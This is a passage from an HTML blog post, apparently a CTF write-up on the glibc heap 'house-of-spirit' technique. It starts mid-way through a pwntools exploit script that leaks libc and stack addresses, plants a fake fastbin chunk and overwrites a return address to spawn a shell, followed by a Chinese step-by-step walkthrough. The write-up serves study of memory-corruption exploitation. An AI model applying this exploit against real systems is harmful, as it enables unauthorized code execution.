class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</div><div class="line">        comment2(<span class="string">"10"</span>,<span class="string">"AAAA"</span>)</div><div class="line">        p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">        p.send(<span class="string">'y'</span>)   </div><div class="line"></div><div class="line">    raw_input(<span class="string">'leak system_addr'</span>)</div><div class="line">    libc_base = leaklibc()</div><div class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line">    binsh_addr = libc_base + next(libc.search(<span class="string">'sh\0'</span>))</div><div class="line">    log.success(<span class="string">"system_addr: &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line">    log.success(<span class="string">"binsh_addr: &#123;&#125;"</span>.format(hex(binsh_addr)))</div><div class="line"></div><div class="line">    raw_input(<span class="string">'leak stack address'</span>)</div><div class="line">    stack_addr = leakstack()</div><div class="line">    log.success(<span class="string">"stack_addr: &#123;&#125;"</span>.format(hex(stack_addr)))</div><div class="line"></div><div class="line">    raw_input(<span class="string">'overflow return addr to exec system("/bin/sh")'</span>)   </div><div class="line">    <span class="comment"># add fake chunk to fastbin</span></div><div class="line">    fakechunk(stack_addr)</div><div class="line">    <span class="comment"># alloc fake chunk to name, and overwrite return addr of survey</span></div><div class="line">    name = <span class="number">76</span>*<span class="string">"E"</span> + p32(system_addr) + <span class="string">"EEEE"</span> + p32(binsh_addr)</div><div class="line">    comment1(name,<span class="string">"50"</span>,<span class="string">"EEEE"</span>,<span class="string">"EEEE"</span>)</div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'n'</span>)</div><div class="line">    p.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
+<h2 id="3-利用过程"><a href="#3-利用过程" class="headerlink" title="3. 利用过程"></a>3. 利用过程</h2><p>1）首先添加 100 条评论，使得 v1 溢出修改 nbytes 为 0x6e。nbytes 被修改前内存中地址如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/46175149.jpg" alt=""><br>nbytes 被修改后内存中地址如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/70375310.jpg" alt="">    </p>
+<p>2）接着利用内存泄露漏洞可得到 libc 中 _IO_file_sync 函数在内存中的地址，题目已给 libc.so 文件，通过该地址可计算处 system 函数和 “/bin/sh” 字符串的地址。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/50239044.jpg" alt=""><br>此外，利用该漏洞还能泄露栈地址，通过计算偏移量可得到堆指针 *name 的内存地址，为后续覆盖该堆指针做准备。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/91788711.jpg" alt="">       </p>
+<p>3）继续添加评论时，可在 reason 内存中伪造一个 fast chunk。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/93324098.jpg" alt="">  </p>
+<p>4）溢出 comment 变量内存，修改堆指针 *name 指向伪造的 chunk。堆指针被覆盖前内存如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/47717698.jpg" alt=""><br>堆指针被覆盖后内存如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/37025857.jpg" alt="">     </p>
+<p>5）之后添加评论前程序会 free(name)，此时伪造的 chunk 将被加入 fastbin 中。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/18602401.jpg" alt="">   </p>
+<p>6）再次添加评论，会把栈中伪造的 chunk 分配给 name，此时溢出 name 可覆盖 survey 函数的返回地址为 system 函数地址。返回地址被修改前内存如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/27242292.jpg" alt=""><br>返回地址被修改后内存如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/44036325.jpg" alt="">   </p>
+<p>7）程序返回时将执行 system。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/83693658.jpg" alt="">   </p>
+<hr>
+<p>References:<br>[1] <a href="http://phrack.org/issues/66/10.html" target="_blank" rel="external">MALLOC DES-MALEFICARUM</a><br>[2] <a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit.html" target="_blank" rel="external">House of Spirit</a><br>[3] <a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="external">堆之House of Spirit</a>  </p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/heap/" rel="tag"># heap</a>
+          
+            <a href="/tags/house-of-spirit/" rel="tag"># house-of-spirit</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/0419/linux-glibc-heap-houseofforce/" rel="next" title="Linux glibc heap house-of-force">
+                <i class="fa fa-chevron-left"></i> Linux glibc heap house-of-force
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/0316/configure-the-linux-python-development-environment/" rel="prev" title="配置 Linux Python 开发环境">
+                配置 Linux Python 开发环境 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/binary.jpg"
+               alt="0x4C43" />
+          <p class="site-author-name" itemprop="name">0x4C43</p>
+           
+              <p class="site-description motion-element" itemprop="description">Binary Exploitation</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">47</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/0x4C43" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank" rel="external nofollow">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-释放-fastbin-chunk"><span class="nav-text">0x01 释放 fastbin chunk</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-检查标志位"><span class="nav-text">1. 检查标志位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-检查-size"><span class="nav-text">2. 检查 size</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-利用思路"><span class="nav-text">0x2 利用思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-实例分析"><span class="nav-text">0x03 实例分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-漏洞"><span class="nav-text">1. 漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1）缓存区溢出"><span class="nav-text">1）缓存区溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2）信息泄露"><span class="nav-text">2）信息泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-利用脚本"><span class="nav-text">2. 利用脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-利用过程"><span class="nav-text">3. 利用过程</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0x4C43</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人次
+    </span>
+  
+
+  
+    <span class="site-pv">
+      总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://0x4c43s-blog.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://0x4c43.cn/2018/0413/linux-glibc-heap-houseofspirit/';
+          this.page.identifier = '2018/0413/linux-glibc-heap-houseofspirit/';
+          this.page.title = 'Linux glibc heap house-of-spirit';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://0x4c43s-blog.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "c190dfc84c3444f78b4a39fbfe45d4ee",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
